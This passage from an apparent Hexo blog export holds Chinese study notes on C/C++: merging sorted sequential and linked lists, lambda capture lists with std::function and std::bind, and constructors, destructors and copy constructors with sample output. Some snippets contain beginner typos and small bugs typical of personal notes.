class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; headNode-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, headNode-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;length = num;<br>    (*headNode)-&gt;elem = (ElemType *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType) * num);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*headNode)-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(linkList *headNode1, linkList headNode2)</span> &#123;<br>    <span class="hljs-type">int</span> subLa = <span class="hljs-number">0</span>, subLb = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> l1 = (*headNode1)-&gt;length, l2 = headNode2-&gt;length;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    ElemType *temC = (<span class="hljs-type">int</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * (l1 + l2));<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; subLa &lt; l1 &amp;&amp; subLb &lt; l2; ++i) &#123;<br>        temC[i] = (*headNode1)-&gt;elem[subLa] &lt; headNode2-&gt;elem[subLb] ? (*headNode1)-&gt;elem[subLa++]<br>                                                                     : headNode2-&gt;elem[subLb++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (i &lt; l1 + l2) &#123;<br>        *(temC + i) = subLb &lt; l2 ? (headNode2)-&gt;elem[subLb++] : (*headNode1)-&gt;elem[subLa++];<br>        i++;<br>    &#125;<br>    (*headNode1)-&gt;elem = temC;<br>    (*headNode1)-&gt;length = l1 + l2;<br><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">destroyLink</span><span class="hljs-params">(linkList pDel)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pDel == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(pDel-&gt;elem);<br>    <span class="hljs-built_in">free</span>(pDel);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode1 = <span class="hljs-literal">NULL</span>;<br>    linkList headNode2 = <span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode1);<br>    initList(&amp;headNode2);<br>    combineList(&amp;headNode1, headNode2);<br>    printfList(headNode1);<br>    destroyLink(headNode1);<br>    destroyLink(headNode2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType elem;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br><br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;elem = <span class="hljs-number">0</span>;<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    node *moveNode = (*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;temNode-&gt;elem);<br>        moveNode-&gt;next = temNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(linkList *headNode, linkList headNode2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || headNode2 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode1 = (*headNode)-&gt;next, *moveNode2 = headNode2-&gt;next, *moveNodeC = (*headNode);<br>    <span class="hljs-keyword">while</span> (moveNode1 != <span class="hljs-literal">NULL</span> &amp;&amp; moveNode2 != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (moveNode1-&gt;elem &gt; moveNode2-&gt;elem) &#123;<br>            moveNodeC-&gt;next = moveNode2;<br>            moveNode2 = moveNode2-&gt;next;<br>            moveNodeC=moveNodeC-&gt;next;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            moveNodeC-&gt;next = moveNode1;<br>            moveNode1 = moveNode1-&gt;next;<br>            moveNodeC=moveNodeC-&gt;next;<br>        &#125;<br>    &#125;<br>    moveNodeC-&gt;next = moveNode1==<span class="hljs-literal">NULL</span> ? moveNode2 : moveNode1;<br>    <span class="hljs-built_in">free</span>(headNode2);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, moveNode-&gt;elem);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode1=<span class="hljs-literal">NULL</span>;<br>    linkList headNode2=<span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode1);<br>    initList(&amp;headNode2);<br>    printfNode(headNode1);<br>    combineList(&amp;headNode1,headNode2);<br>    printfNode(headNode1);<br>    destroyList(headNode1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lambda高级使用</title>
    <link href="/2023/03/26/c++/lambda%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/03/26/c++/lambda%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="lambda高级使用"><a href="#lambda高级使用" class="headerlink" title="lambda高级使用"></a>lambda高级使用</h1><h2 id="捕获列表"><a href="#捕获列表" class="headerlink" title="捕获列表"></a>捕获列表</h2><p>lambda 表达式还可以通过捕获列表捕获一定范围内的变量：</p><ul><li>[] 不捕获任何变量。</li><li>[&amp;] 捕获外部作用域中所有变量，并作为引用在函数体中使用（按引用捕获）。</li><li>[&#x3D;] 捕获外部作用域中所有变量，并作为副本在函数体中使用（按值捕获）。</li><li>[&#x3D;，&amp;foo] 按值捕获外部作用域中所有变量，并按引用捕获 foo 变量。</li><li>[bar] 按值捕获 bar 变量，同时不捕获其他变量。</li><li>[this] 捕获当前类中的 this <a href="http://c.biancheng.net/c/80/">指针</a>，让 lambda 表达式拥有和当前类成员函数同样的访问权限。如果已经使用了 &amp; 或者 &#x3D;，就默认添加此选项。捕获 this 的目的是可以在 lamda 中使用当前类的成员函数和成员变量。</li></ul><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="捕获"><a href="#捕获" class="headerlink" title="捕获"></a>捕获</h3><ol><li>没有捕获的时候，我们将该lambda变量可以看成函数指针</li><li>有捕获的时候，我们将该lambda表达式堪称仿函数</li></ol><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol><li><p>使用<code>function</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vector&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a&#123;<span class="hljs-number">9</span>&#125;;<br>    <span class="hljs-type">int</span> b&#123;<span class="hljs-number">10</span>&#125;;<br>    [a,b](<span class="hljs-type">int</span> x)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;a+b&lt;&lt;std::endl&lt;&lt;x&lt;&lt;std::endl;<br>    &#125;(<span class="hljs-number">88</span>);<br>    std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; func&#123;[](<span class="hljs-type">int</span> num,std::string S)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;num= &quot;</span>&lt;&lt;num&lt;&lt;<span class="hljs-string">&quot; name= &quot;</span>&lt;&lt;S&lt;&lt;std::endl;<br>    &#125;&#125;;<br>    <span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>使用<code>bind</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a&#123;<span class="hljs-number">9</span>&#125;;<br>    <span class="hljs-type">int</span> b&#123;<span class="hljs-number">10</span>&#125;;<br>    [a,b](<span class="hljs-type">int</span> x)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;a+b&lt;&lt;std::endl&lt;&lt;x&lt;&lt;std::endl;<br>    &#125;(<span class="hljs-number">88</span>);<br>    <span class="hljs-keyword">auto</span> f2= std::<span class="hljs-built_in">bind</span>([](<span class="hljs-type">int</span> num,std::string S)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;num= &quot;</span>&lt;&lt;num&lt;&lt;<span class="hljs-string">&quot; name= &quot;</span>&lt;&lt;S&lt;&lt;std::endl;<br>    &#125;,std::placeholders::_1,std::placeholders::_2);<br>    <span class="hljs-built_in">f2</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数</title>
    <link href="/2023/03/26/c++/%E5%87%BD%E6%95%B0/"/>
    <url>/2023/03/26/c++/%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><ol><li><p>通过类里函数可以给私有成员赋值，同时也可以通过函数return 出值</p></li><li><p>特殊的成员函数，主要用于创建对象时初始化对象-&gt;给对象成员赋予初值</p></li><li><p>构造函数的特点</p><ul><li>构造函数的函数名与类名相同</li><li>构造函数没有返回值类型，也没有返回值</li><li>构造函数可以重载</li></ul></li><li><p>没有写构造函数，自己会生成，由于内联函数，牺牲时间换效率</p><ul><li><p>系统给的构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Myclass</span>()&#123;&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>系统给的构造函数相当于低保</p></li><li><p>构造函数，在创建时系统就会调用，不能通过对象调用构造函数</p></li><li><p>默认给的构造函数，是<code>public</code>类型</p></li><li><p><code>const</code>:改变性质，将变量变成常量</p><ul><li><p>对<code>const</code>修饰的变量在函数创建时进行赋值：</p></li><li><p>是在初始化的时候赋初值，不是在声明的时候</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostram&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">chg</span><br>&#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> num1;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> num2;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> num3;<br>    <span class="hljs-built_in">chg</span>();<br>  <span class="hljs-keyword">private</span>:  <br>&#125;;<br><br>chg::<span class="hljs-built_in">chg</span>(<span class="hljs-type">int</span> n,<span class="hljs-type">int</span> i):<span class="hljs-built_in">num1</span>(n),<span class="hljs-built_in">num2</span>(i),<span class="hljs-built_in">num3</span>(<span class="hljs-number">3</span>)<span class="hljs-comment">//括号里面可以是变量也可以是常量</span><br>&#123;<br>    <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><ol><li>一种特殊的函数，作用是在对象的生命周期结束时进行清理，系统可以自动调用析构函数</li><li>函数名与类名一致，在前面加上<code>~</code></li><li>没有返回值，也没有参数，但必须有参数表也就是（）</li><li>有低保，没写的话，系统自动分配</li><li>可以通过外部访问到析构函数</li><li>在类创建时，自动使用一次，构造，和析构（在生命周期结束时，会自动调用析构函数）</li><li>先构造的后析构</li></ol><h2 id="拷贝构造，-函数"><a href="#拷贝构造，-函数" class="headerlink" title="拷贝构造， 函数"></a>拷贝构造， 函数</h2><ol><li><p>先是构造函数，才可能是拷贝构造函数</p></li><li><p>有低保，系统会统一给</p></li><li><p>第一个参数是，该类的对象</p><p>操作实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">Myclass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">Myclass</span>();<span class="hljs-comment">//构造函数</span><br>    ~<span class="hljs-built_in">Myclass</span>();<span class="hljs-comment">//析构函数</span><br>    <span class="hljs-built_in">Myclass</span>(Myclass&amp; obj);<span class="hljs-comment">//拷贝构造函数</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用时机</p><ul><li><p>使用一个对象给另一个对象进行初始化</p></li><li><p>使用一个对象构造另一个对象</p></li><li><p>函数的参数是类的对象</p></li><li><p>返回值是类</p><p>实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">zjy</span><br>&#123;<br>    <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">zjy2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    zjy zjy3;<span class="hljs-comment">//进行无参构造</span><br>    <br>    <span class="hljs-keyword">return</span> zjy3;<span class="hljs-comment">//由于zjy3存在于栈区，所以函数结束会被回收，因此返回值是zjy3的复制体，此时调用了拷贝构造</span><br>&#125;<br><br><br><br></code></pre></td></tr></table></figure> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">zjy</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> chg;<br>     <span class="hljs-built_in">zjy</span>(<span class="hljs-type">int</span> n);<br>     <span class="hljs-built_in">zjy</span>();<br>     ~<span class="hljs-built_in">zjy</span>();<br>     <span class="hljs-built_in">zjy</span>(zjy&amp;obj);<br>&#125;;<br> zjy::<span class="hljs-built_in">zjy</span>()<br>&#123;<br>     cout&lt;&lt;<span class="hljs-string">&quot;无参构造&quot;</span>&lt;&lt;endl;<br>&#125;<br> zjy::<span class="hljs-built_in">zjy</span>(zjy &amp;obj)<br>&#123;<br>    cout&lt;&lt;<span class="hljs-string">&quot;拷贝构造函数&quot;</span>&lt;&lt;endl;<br>&#125;<br><br> zjy::~<span class="hljs-built_in">zjy</span>()<br>&#123;<br>    cout&lt;&lt;<span class="hljs-string">&quot;析构函数&quot;</span>&lt;&lt;endl;<br>&#125;<br><br><br> zjy::<span class="hljs-built_in">zjy</span>(<span class="hljs-type">int</span> n)<br>&#123;<br>     chg=<span class="hljs-number">520</span>;<br>     n=chg;<br>     cout&lt;&lt;n&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;带参构造函数&quot;</span>&lt;&lt;endl;<br>&#125;<br><br><span class="hljs-function">zjy <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     zjy obj;<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">func</span>();<br>    <span class="hljs-function">zjy <span class="hljs-title">obj</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;<br>    zjy chg=<span class="hljs-built_in">func</span>();<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第二个代码运行结果：</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201151814859.png" alt="image-20221201151814859"></p><ul><li>无参构造：<code>func</code>里面的<code>obj</code></li><li>析构函数：函数调用完会释放内存，这里释放的是第一个obj，所以调用析构函数</li><li>带参构造：43行代码</li><li>无参构造：是因为用了chg来接收</li></ul><p>由于上面结果不一致，重点参考下面的</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201152314605.png" alt="image-20221201152314605"></p><ul><li>无参构造：调用<code>test_func_2()</code>，从主调函数，进入被调函数，创建<code>Monster obj</code>采用的是无参构造</li><li>拷贝构造1号：因为需要函数返回<code>obj</code>,但是函数里面的数据在函数完成时，会被释放，所以采用拷贝构造创建的副本<code>obj</code></li><li>析构（1）：当函数完成时，释放内存，调用析构函数释放原本的<code>obj</code></li><li>析构（2）：由于没有接收<code>obj</code>,所以会在执行完76行释放返回的<code>obj</code>副本</li><li>无参构造：78行调用函数（如上的无参构造）</li><li>拷贝构造1号：如上</li><li>析构（3）：如上，第一个析构</li><li>析构（4）：这里的析构和第二个析构不一样，这里的析构是因为，<code>main</code>完成了，释放<code>monster</code>接收的<code>obj</code></li></ul></li><li><p>问题1：为什么第78行<code>Monster monster=test_func_2()</code>这里没有拷贝构造？</p><ul><li>没有东西去接收复制体时，系统会创建一个临时的对象，再用拷贝构造，将返回的<code>obj</code>，拷贝构造给临时变量</li><li>由于78行，有一个<code>monster</code>接收返回的<code>obj</code>，系统优化，直接复制给<code>monster</code>,所以不会调用拷贝构造</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">zjy <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">zjy</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">func</span>();<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\笔记\c++\函数.assets\image-20221201154807685.png" alt="image-20221201154807685"></p><ul><li>无参构造：因为这里在<code>return 